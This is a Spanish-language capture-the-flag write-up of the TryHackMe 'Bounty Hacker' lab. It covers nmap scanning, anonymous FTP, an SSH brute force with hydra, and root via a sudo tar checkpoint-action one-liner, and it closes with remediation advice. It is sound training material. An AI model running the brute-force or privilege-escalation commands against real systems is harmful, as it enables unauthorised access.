# Write-up: Bounty Hacker (TryHackMe)

**Autor:** Juan Merino Garrido
**Plataforma:** TryHackMe
**Máquina:** Bounty Hacker
**Dificultad:** Fácil

Este write-up detalla el proceso de enumeración, explotación y escalada de privilegios en la máquina "Bounty Hacker", la primera máquina de mi preparación para el eJPTv2.

---

## 1. Reconocimiento y Escaneo

El escaneo inicial se realizó con `nmap` para identificar todos los puertos TCP abiertos, sus servicios y versiones.

**Comando:**
```bash
sudo nmap -p- --open --min-rate 5000 -sS -sCV -n -Pn <IP> -oN escaneo.txt
````

**Resultados Clave:**

  * **Puerto 21/tcp:** FTP (vsftpd 3.0.3)
  * **Puerto 22/tcp:** SSH (OpenSSH 7.2p2)
  * **Puerto 80/tcp:** HTTP (Apache httpd 2.4.18)

-----

## 2\. Enumeración

La superficie de ataque inicial apuntaba al FTP y al servidor web.

### FTP (Puerto 21)

El servicio FTP permitía un inicio de sesión anónimo (`anonymous` sin contraseña).

```bash
$ ftp <IP>
Connected to <IP>.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password: [Enter]
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           324 Jul 30 2020  locks.txt
-rw-r--r--    1 ftp      ftp            68 Jul 30 2020  task.txt
226 Directory send OK.
```

Se encontraron dos archivos:

1.  **`locks.txt`:** Un diccionario de contraseñas.
2.  **`task.txt`:** Una nota que revelaba el nombre de un usuario: **`lin`**.

Se descargó el diccionario con `get locks.txt`.

-----

## 3\. Obtención de Acceso (Usuario)

Con un nombre de usuario (`lin`), un diccionario de contraseñas (`locks.txt`) y un servicio de login (SSH en el puerto 22), el siguiente paso fue un ataque de fuerza bruta con `hydra`.

**Comando:**

```bash
hydra -l lin -P locks.txt <IP> ssh
```

**Resultado:**
Hydra encontró la contraseña con éxito: `RedDr4gonSynd1cat3`

Usando esta credencial, se obtuvo acceso a la máquina vía SSH:

```bash
$ ssh lin@<IP>
lin@<IP>'s password: RedDr4gonSynd1cat3
...
lin@bountyhacker:~$ whoami
lin
lin@bountyhacker:~$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

Se capturó la flag de usuario.

-----

## 4\. Escalada de Privilegios (Root)

El primer paso en la post-explotación fue comprobar los permisos de `sudo` del usuario.

**Comando:**

```bash
lin@bountyhacker:~$ sudo -l
```

**Resultado:**

```
User lin may run the following commands on bountyhacker:
    (ALL) NOPASSWD: /bin/tar
```

El usuario `lin` puede ejecutar el binario `/bin/tar` como `root` sin necesidad de contraseña. Esta es una vulnerabilidad de escalada de privilegios conocida y documentada en [GTFOBins](https://gtfobins.github.io/gtfobins/tar/).

Se utilizó el comando de explotación especificado para obtener una shell de `root`:

```bash
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# whoami
root
# cat /root/root.txt
THM{80UNTY_h4ck3r}
```

Se obtuvo acceso `root` y se capturó la flag final.

-----

## 5\. Conclusiones y Remediación

  * **FTP Anónimo:** Permitir el acceso anónimo con permisos de lectura es un riesgo alto que lleva a la fuga de información (usuarios, contraseñas). **Solución:** Deshabilitar el acceso anónimo.
  * **Contraseñas Débiles (SSH):** El usuario `lin` usaba una contraseña simple incluida en un diccionario. **Solución:** Implementar una política de contraseñas robustas o, preferiblemente, deshabilitar la autenticación por contraseña en SSH en favor de claves públicas/privadas.
  * **Sudoers Incorrectos:** El binario `/bin/tar` nunca debería estar disponible para un usuario sin privilegios con permisos `NOPASSWD`. **Solución:** Revisar el archivo `/etc/sudoers` para eliminar permisos innecesarios.

<!-- end list -->

```
```
